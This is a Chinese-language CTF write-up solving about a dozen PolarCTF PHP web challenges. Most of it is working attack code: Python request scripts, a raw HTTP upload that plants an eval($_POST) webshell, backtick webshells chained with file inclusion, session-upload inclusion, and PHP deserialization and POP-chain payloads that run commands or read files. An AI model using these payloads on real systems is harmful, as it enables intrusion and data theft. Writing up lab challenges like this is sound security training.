# 签到喵
	- 一眼关注微信公众号，脚本里的base64提示`请发送“宝宝想要flag”`，关注PolarCTF发送即可
- # cool
	- 简单RCE，用动态函数绕过拿flag
		- ```python
		  url = "http://5aac0d2c-030c-4b28-a345-ad698f526deb.www.polarctf.com:8090/"
		  r = requests.post(
		      url,
		      params = {
		          "a": "('syst'.'em')('cat *');",
		      },
		  )
		  print(r.text)
		  ```
	- `flag{4512esfgsdIirhgui82545er4g5e5rg4er1}`
- # cookie欺骗
	- 改cookie即可：`Cookie: user=admin`
- # 干正则
	- 简单命令执行，引号绕过正则，使用parse_str覆盖变量a绕过if检测
	- ```python
	  url = "http://ebaf1b5f-34bf-454d-885f-de1c6b9ab541.www.polarctf.com:8090/"
	  
	  id_str = "a[]=" + "www.polarctf.com"
	  cmd = " -h; cat fl''ag.php"
	  r = requests.get(url, params = {
	      "id": id_str,
	      "cmd": cmd
	  })
	  print(r.text)
	  ```
- # upload
	- 双写绕过文件上传，F12有提示源码
	- ```http
	  POST / HTTP/1.1
	  Host: 8cb63036-39d0-4dc5-8c2c-2e684c3fc417.www.polarctf.com:8090
	  Content-Length: 318
	  Cache-Control: max-age=0
	  Upgrade-Insecure-Requests: 1
	  Origin: http://8cb63036-39d0-4dc5-8c2c-2e684c3fc417.www.polarctf.com:8090
	  Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoXE8wHLlno2SYrJ8
	  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
	  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
	  Referer: http://8cb63036-39d0-4dc5-8c2c-2e684c3fc417.www.polarctf.com:8090/?action=show_code
	  Accept-Encoding: gzip, deflate, br
	  Accept-Language: en-US,en;q=0.9
	  Connection: close
	  
	  ------WebKitFormBoundaryoXE8wHLlno2SYrJ8
	  Content-Disposition: form-data; name="upload_file"; filename="a.phasap"
	  Content-Type: application/x-php
	  
	  <?php eval($_POST[1]);
	  
	  ------WebKitFormBoundaryoXE8wHLlno2SYrJ8
	  Content-Disposition: form-data; name="submit"
	  
	  ä¸�ä¼ 
	  ------WebKitFormBoundaryoXE8wHLlno2SYrJ8--
	  ```
- # 你的马呢？
	- 题目会include GET参数file
	- 上传名字为a.txt, 内容为``<?=`$_GET[1]`?>``的文件
	- 然后include传入的a.txt即可RCE： `http://1c95226f-a876-4f6c-8851-ae776d2f266d.www.polarctf.com:8090/index.php?file=uploads/a.txt&1=cat%20/flag.txt`
- # ezphp
	- 提示爬虫，访问`robots.txt`，看到`file/file.php`和`uploads`，前者支持include文件，后者支持上传文件
	- 上传名字为a.gif, 内容为``<?=`$_GET[1]`?>``的文件，可以看到路径为`uploads/images/a.gif`
	- 然后include这个a.gif即可RCE，flag在`/home/webuser/flag`：`http://67248b86-3773-4c32-a1f8-b57b5fc4984a.www.polarctf.com:8090/file/file.php?filename=../uploads/images/a.gif&1=cat%20/home/webuser/flag`
- # 随机值
	- 这题挺莫名其妙的，应该是想考察引用但是代码写错了
	- 构造payload：
		- ```php
		  <?php
		  // include "flag.php";
		  class Index{
		      private $Polar1;
		      private $Polar2;
		      protected $Night;
		      protected $Light;
		      function __construct() {
		          $this -> Polar1 = $this -> Polar2 = "123";
		          $this -> Night = $this -> Light = "123";
		      }
		  }
		  $index = new Index();
		  echo urlencode(serialize($index));
		  ?> 
		  ```
	- 然后直接打：
		- ```
		  http://0b42f92b-a5b3-4e77-ba78-fa83fc6273c4.www.polarctf.com:8090/?sys=O%3A5%3A%22Index%22%3A4%3A%7Bs%3A13%3A%22%00Index%00Polar1%22%3Bs%3A3%3A%22123%22%3Bs%3A13%3A%22%00Index%00Polar2%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22%00%2A%00Night%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22%00%2A%00Light%22%3Bs%3A3%3A%22123%22%3B%7D
		  ```
- # phpurl
	- 提示给了源码在`index.phps`
	- urlencode编码两次即可绕过：`http://696a36bf-992b-4bee-a977-06f55f515341.www.polarctf.com:8090/?sys=%25%37%38%25%37%38%25%37%33`
- # 你想逃也逃不掉
	- 字符逃逸
		- ```python
		  
		  url = "http://4a31a66d-0339-4395-bd4f-004af200e72d.www.polarctf.com:8090/"
		  r = requests.post(url, params = {
		      "passwd": """";s:4:"sign";s:6:"ytyyds";s:4:"sbsb";s:6:"123456";}"""
		  }, data = {
		      "name": "gif" * 7
		  })
		  print(r.text)
		  ```
- # safe_include
	- 因为可以写入session并include任意文件，所以可以考虑强制开启session、将webshell写入session并include
	- 服务器会将payload写入session, 可以使用伪协议在url中插入``<?=`$_GET[1]`?>``，然后在服务器将payload写入session后include session
	- ```python
	  url = "http://3bdb9d1f-5542-497c-a851-cb7b41eb396e.www.polarctf.com:8090/"
	  # url = "http://127.0.0.1:8080/"
	  
	  payload = "php://filter/read=a|<?=`$_GET[1]`?>|a/resource=/tmp/sess_test"
	  
	  r = requests.post(
	      url,
	      params={"xxs": payload, "1": "cat /flag"},
	      data={"PHP_SESSION_UPLOAD_PROGRESS": "123123"},
	      files={"file": ("a.txt", "aaa" * 1000 * 50)},
	      cookies={"PHPSESSID": "test"},
	  )
	  print(r.text)
	  ```
- # 苦海
	- 简单POP链，但是flag在`/var/flag.php`，就很扯淡
	- payload构造：
		- ```php
		  <?php
		  class User
		  {
		      public $name = 'PolarNight';
		      public $flag = 'syst3m("rm -rf ./*");';
		  
		      public function __construct()
		      {
		          echo "删库跑路，蹲监狱~";
		      }
		  
		      public function printName()
		      {
		          echo $this->name;
		          return 'ok';
		      }
		  
		      public function __wakeup()
		      {
		          echo "hi, Welcome to Polar D&N ~ ";
		          $this->printName();
		      }
		  
		      public function __get($cc)
		      {
		          echo "give you flag : " . $this->flag;
		      }
		  }
		  
		  class Surrender
		  {
		      private $phone = 110;
		      public $promise = '遵纪守法，好公民~';
		  
		      public function __construct()
		      {
		          $this->promise = '苦海无涯，回头是岸！';
		          return $this->promise;
		      }
		  
		      public function __toString()
		      {
		          return $this->file['filename']->content['title'];
		      }
		  }
		  
		  class FileRobot
		  {
		      public $filename = 'flag.php';
		      public $path;
		  
		      public function __get($name)
		      {
		          echo "FileRobot:__get";
		          $function = $this->path;
		          return $function();
		      }
		  
		      public function Get_file($file)
		      {
		          $hint = base64_encode(file_get_contents($file));
		          echo $hint;
		      }
		  
		      public function __invoke()
		      {
		          $content = $this->Get_file($this->filename);
		          echo $content;
		      }
		  }
		  # User::__wakeup --> User::printName --> Surrender::__toString --> 
		  # FileRobot::__get --> FileRobot::__invoke --> FileRobot::Get_file
		  $filerobot = new FileRobot();
		  $filerobot -> filename = "/var/flag.php";
		  if(isset($_SERVER["argv"][1])) {
		      $filerobot -> filename = $_SERVER["argv"][1];
		      var_dump($_SERVER["argv"]);
		  }
		  $filerobot -> path = $filerobot;
		  
		  $surrender = new Surrender();
		  $surrender -> file = [
		      "filename" => $filerobot
		  ];
		  
		  $user = new User();
		  $user -> name = $surrender;
		  echo "sta"."rt" . base64_encode(serialize($user)) . "s" . "top";
		  unserialize(serialize($user));
		  ```